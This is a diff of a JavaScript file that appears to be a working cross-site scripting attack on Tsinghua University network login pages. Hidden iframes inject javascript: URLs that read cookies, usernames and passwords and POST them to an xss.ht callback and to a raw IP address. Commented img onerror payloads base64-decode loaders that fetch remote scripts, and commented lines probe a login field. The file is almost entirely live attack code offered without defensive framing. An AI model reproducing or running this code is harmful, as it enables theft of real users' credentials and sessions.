@@ -52,29 +52,35 @@
 
 // <img style="display:none" src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9MZWFybkhlbHBlci9MZWFybkhlbHBlci9hLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>
 
-function loaded() {
-    console.log(document)
-    var a=document.getElementById('test3').contentDocument.createElement('script');
-    a.textContent="setTimeout(()=>{alert(document.getElementsByName('userid')[0].value)}, 1000)";
-    document.getElementById('test3').contentDocument.body.appendChild(a);
-}
+// function loaded() {
+//     console.log(document.getElementById('test3').contentDocument)
+//     var a=document.getElementById('test3').contentDocument.createElement('script');
+//     a.textContent="setTimeout(()=>{alert(document.getElementsByName('userid')[0].value)}, 1000)";
+//     document.getElementById('test3').contentDocument.body.appendChild(a);
+// }
 
-var ele3 = document.createElement('IFRAME')
-ele3.src = "http://learn.tsinghua.edu.cn"
-ele3.id = "test3"
-// ele3.style = "display: none"
-document.children[0].appendChild(ele3)
-setTimeout(() => {
-    loaded()
-}, 1000)
+// var ele3 = document.createElement('IFRAME')
+// ele3.src = "http://learn.tsinghua.edu.cn"
+// ele3.id = "test3"
+// // ele3.style = "display: none"
+// document.children[0].appendChild(ele3)
+// setTimeout(() => {
+//     loaded()
+// }, 1000)
 
 
-// var ele = document.createElement('IFRAME')
-// ele.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt})))"
-// ele.style = "display: none"
-// document.children[0].appendChild(ele)
+var ele = document.createElement('IFRAME')
+ele.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt})))"
+ele.style = "display: none"
+document.children[0].appendChild(ele)
 
-// var ele2 = document.createElement('IFRAME')
-// ele2.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'http://166.111.68.92/save?'+cdt+'%26'+uname+'%26'+pass, true), xmlHttp.send(null))"
-// ele2.style = "display: none"
-// document.children[0].appendChild(ele2)
+var ele2 = document.createElement('IFRAME')
+ele2.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'http://166.111.68.92/save?'+cdt+'%26'+uname+'%26'+pass, true), xmlHttp.send(null))"
+ele2.style = "display: none"
+document.children[0].appendChild(ele2)
+
+// <img style="display:none" src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vbHVjaGVuZy5zYWVwYS5vcmcvYS5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
+
+// document.getElementsByName('content_frame')[0].contentDocument.getElementById('test3')
+// document.getElementsByName('content_frame')[0].contentDocument.getElementById('test3').contentDocument.getElementsByName('userid')[0].value
+// document.getElementsByName('content_frame')[0].contentDocument.getElementById('test3').contentDocument.getElementsByName('userid')[0].addEventListener('input', ()=>{console.log(1)})
